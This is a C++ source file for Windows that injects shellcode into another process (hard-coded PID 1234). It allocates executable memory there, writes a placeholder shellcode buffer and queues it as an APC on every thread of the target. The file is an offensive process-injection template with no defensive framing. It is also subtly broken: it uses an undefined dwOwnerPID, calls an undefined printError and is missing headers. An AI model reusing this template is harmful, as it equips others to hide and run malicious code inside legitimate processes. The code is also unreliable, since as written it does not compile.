#include <iostream>
#include <string>
#include <Windows.h>


BOOL hijack_apc( DWORD proc_id,PTHREAD_START_ROUTINE pthread);

BOOL hijack_apc(DWORD proc_id,PTHREAD_START_ROUTINE pthread) 
{ 
  HANDLE hThreadSnap = INVALID_HANDLE_VALUE; 
  THREADENTRY32 te32; 
  HANDLE current_thread = NULL;
  
  hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 ); 
  if( hThreadSnap == INVALID_HANDLE_VALUE ) 
    return( FALSE ); 
 
  te32.dwSize = sizeof(THREADENTRY32 ); 

  if( !Thread32First( hThreadSnap, &te32 ) ) 
  {
    printError( TEXT("Thread32First") );
    CloseHandle( hThreadSnap );     
    return( FALSE );
  }
  do 
  { 
    if( te32.th32OwnerProcessID == dwOwnerPID )
    {
      _tprintf( TEXT("\n     THREAD ID      = 0x%08X"), te32.th32ThreadID ); 
	  current_thread = OpenThread(THREAD_ALL_ACCESS,TRUE,te32.th32ThreadID);
	  QueueUserAPC((PAPCFUNC)pthread,current_thread,NULL);
	  Sleep(2000);
    }
  } while( Thread32Next(hThreadSnap, &te32 ) );

  CloseHandle( hThreadSnap );
  return( TRUE );
}


int main(){
	
	char shellcode[] = "//your shellcode here";
	
	LPVOID remote_addr = NULL;
	HANDLE proc_handle=NULL;
	
	proc_handle = OpenProcess(PROCESS_ALL_ACCESS,NULL,1234);
	remote_addr = VirtualAllocEx(proc_handle,NULL,sizeof shellcode,MEM_COMMIT| MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remote_addr;
	
	WriteProcessMemory(proc_handle,remote_addr,shellcode,sizeof shellcode,NULL);
	
	hijack_apc(1234,apcRoutine);
	
	return 0;
}
